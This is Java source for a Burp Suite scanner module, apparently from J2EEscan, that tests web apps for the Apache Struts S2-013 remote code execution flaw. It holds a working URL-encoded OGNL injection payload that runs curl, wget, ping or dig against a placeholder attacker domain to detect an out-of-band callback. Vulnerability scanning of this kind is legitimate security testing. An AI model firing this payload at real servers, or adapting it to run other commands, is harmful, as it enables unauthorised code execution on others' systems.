package burp.j2ee.issues.impl;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StrutsS2013OOB implements IModule {
    private static final String TITLE = "Struts S2-013 Remote Code Execution (OOB)";
    private static final String DESCRIPTION = "J2EEscan identified Struts S2-013 OOB RCE in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-013.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-013<br />"
            + "https://github.com/ronoski/VulApps/tree/master/s/struts2/s2-013";

    private static final String REMEDY = "Upgrade to latest Apache Struts version";

    private PrintWriter stderr;
    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        List<String> cmds = new ArrayList<>();
        cmds.add("curl");
        cmds.add("wget");
        cmds.add("ping");
        cmds.add("dig");
        stderr = new PrintWriter(callbacks.getStderr(), true);
        List<IScanIssue> issues = new ArrayList<>();

        String payload_template ="?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27RCE_CMD%20ATTACKER_DOMAIN%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D";
        IExtensionHelpers helpers = callbacks.getHelpers();

        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        String protocol = curURL.getProtocol();
        String host = curURL.getHost();
        int port = curURL.getPort();
        String path = curURL.getPath();

        for (String cmd : cmds) {
            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
            String payload = payload_template.replace("ATTACKER_DOMAIN",currentCollaboratorPayload).replace("RCE_CMD", cmd);
            try{
                URL newURL = new URL(protocol, host, port,  path + payload);
                byte[] newMessage = helpers.buildHttpRequest(newURL);
                IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),
                        newMessage);

                //stderr.println(newURL.toString()); //debug message
                List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

                if (!collaboratorInteractions.isEmpty()) {
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Firm
                    ));
                    return issues;
                }
            }catch (MalformedURLException ex) {
                stderr.println("Error creating URL " + ex.getMessage());
            }
        }

        return issues;
    }
}
